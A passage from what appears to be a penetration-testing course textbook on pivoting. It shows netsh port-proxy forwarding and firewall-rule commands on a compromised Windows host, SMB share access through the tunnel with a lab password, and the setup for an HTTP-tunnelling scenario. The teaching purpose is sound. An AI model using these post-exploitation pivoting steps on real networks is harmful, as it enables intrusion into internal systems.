
The setup seems to be working. We have successfully scanned the Windows 10 machine's SQL service through a remote port forward on our Kali attack machine.

## 20.3.1.1 Exercises

- Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.
- Use plink.exe to establish a remote port forward to the MySQL service on your Windows 10 client.
- Scan the MySQL port via the remote port forward.

## 20.4 NETSH

For this section we will consider the following scenario:

During an assessment, we have compromised a Windows 10 target through a remote vulnerability and were able to successfully elevate our privileges to SYSTEM. After enumerating the compromised machine, we discover that in addition to being connected to the current network (10.11.0.x) it has an additional network interface that seems to be connected to a different network (192.168.1.x). In this internal subnet, we identify a Windows Server 2016 machine (192.168.1.110) that has TCP port 445 open.

To continue the scenario, we can now look for ways to pivot inside the victim network from the SYSTEM-level shell on the Windows 10 machine. Because of our privilege level, we do not have to deal with User Account Control (UAC), which means we can use the `netsh` utility (installed by default on every modern version of Windows) for port forwarding and pivoting.

However, for this to work, the Windows system must have the *IP Helper* service running and IPv6 support must be enabled for the interface we want to use. Fortunately, both are on and enabled by default on Windows operating systems.

We can check that the *IP Helper* service is running from the Windows Services program to confirm this:

![](img/ec25e59d75726b7041242a56d3376832_606_0.png)

We can confirm *IPv6* support in the network interface's settings:

![](img/ec25e59d75726b7041242a56d3376832_607_0.png)

*Figure 303: IPv6 support enabled*

Similar to the SSH local port forwarding example, we will attempt to redirect traffic destined for the compromised Windows 10 machine on TCP port 4455 to the Windows Server 2016 machine on port 445.

In this example, we will use the netsh (interface) context to add an IPv4-to-IPv4 (v4tov4) proxy (portproxy) listening on 10.11.0.22 (listenaddress=10.11.0.22), port 4455 (listenport=4455) that will forward to the Windows 2016 Server (connectaddress=192.168.1.110) on port 445 (connectport=445):

```powershell
C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
```

*Listing 651 - Local port forwarding using netsh*

Using netstat, we can confirm that port 4455 is listening on the compromised Windows host:

```powershell
C:\Windows\system32> netstat -anp TCP | find "4455"
TCP 10.11.0.22:4455 0.0.0.0:0 LISTENING
```

*Listing 652 - Checking if the port is bound after the forward has been made with netsh*

By default, the Windows Firewall will disallow inbound connections on TCP port 4455, which will prevent us from interacting with our tunnel. Given that we are running with SYSTEM privileges, we can easily remedy this by adding a firewall rule to allow inbound connections on that port.

These netsh options are self-explanatory, but note that we allow (action=allow) specific inbound (dir=in) connections and leverage the firewall (advfirewall) context of netsh.

```powershell
C:\Windows\system32> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
Ok.
```

*Listing 653 - Using netsh to allow inbound traffic on TCP port 4455*

As a final step, we can try to connect to our compromised Windows machine on port 4455 using smbclient. If everything has gone according to plan, the traffic should be redirected and the available network shares on the internal Windows Server 2016 machine should be returned.

As with our earlier scenario, Samba needs to be configured with a minimum SMB version of SMBv2. This is superfluous but we will include the commands here for completeness:

```bash
kali@kali:~$ sudo nano /etc/samba/smb.conf
kali@kali:~$ cat /etc/samba/smb.conf
...  
Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
; write list = root, @padmin

min protocol = SMB2

kali@kali:~$ sudo /etc/init.d/smbd restart
[ ok ] Restarting smbd (via systemctl): smbd.service.

kali@kali:~$ smbclient -L 10.11.0.22 --port=4455 --user=Administrator
Unable to initialize messaging context
Enter WORKGROUP\Administrator's password:

Sharename    Type    Comment
---------    ----    -------
ADMIN$       Disk    Remote Admin
C$           Disk    Default share
Data         Disk
IPC$         IPC     Remote IPC
NETLOGON     Disk    Logon server share
SYSVOL       Disk    Logon server share
Reconnecting with SMB1 for workgroup listing.
**do_connect: Connection to 10.11.0.22 failed (Error NT_STATUS_IO_TIMEOUT)**
**Failed to connect with SMB1 -- no workgroup available**
```

*Listing 654 - Listing network shares on the Windows Server 2016 machine through local port forwarding using NETSH*

We successfully listed the shares, but **smbclient** generated an error. This timeout issue is generally caused by a port forwarding error, but let's test this and determine if we can interact with the shares.

```bash
kali@kali:~$ sudo mkdir /mnt/win10_share

kali@kali:~$ sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share

kali@kali:~$ ls -l /mnt/win10_share/
total 1
-rw-r--r--x 1 root root 7 Apr 17 2019 data.txt

kali@kali:~$ cat /mnt/win10_share/data.txt
data
```

*Listing 655 - Mounting the remote share available on the Windows 2016 Server machine through a port forward*

As demonstrated by the above commands, this error prohibits us from listing workgroups but it does not impact our ability to mount the share. The port forwarding was successful.

## 20.4.1.1 Exercise

- Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.
- Using the SYSTEM shell, attempt to replicate the port forwarding example using netsh.

## 20.5 HTTP Tunnel-ing Through Deep Packet Inspection

So far, we have traversed firewalls based on port filters and stateful inspection. However, certain deep packet content inspection devices may only allow specific protocols. If, for example, the SSH protocol is not allowed, all the tunnels that relied on this protocol would fail.

To demonstrate this, we will consider a new scenario. Similar to our *NIX scenarios, let's assume we have compromised a Linux server through a vulnerability, elevated our privileges to root, and have gained access to the passwords for both the root and student users on the machine.

Even though our compromised Linux server does not actually have deep packet inspection implemented, for the purposes of this section we will assume that a deep packet content inspection feature has been implemented that only allows the HTTP protocol. Unlike the previous scenarios, an SSH-based tunnel will not work here.

In addition, the firewall in this scenario only allows ports 80, 443, and 1234 inbound and outbound. Port 80 and 443 are allowed because this machine is a web server, but 1234 was obviously an oversight since it does not currently map to any listening port in the internal network.

In order to simulate this scenario, we will run the **http tunneling.sh** script on our dedicated Linux client:

```bash
root@debian:~# cat /root/port_forwarding_and_tunneling/http_tunneling.sh
#! /bin/bash

# Clear iptables rules
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F
iptables -X

# SSH Scenario
iptables -F
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 1234 -m state --state NEW -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
root@debian:~# /root/port_forwarding_and_tunneling/http_tunneling.sh
```

*Listing 656 - Content of the http_tunneling.sh script*

In this case, our goal is to initiate a remote desktop connection from our Kali Linux machine to the Windows Server 2016 through the compromised Linux server using only the HTTP protocol.
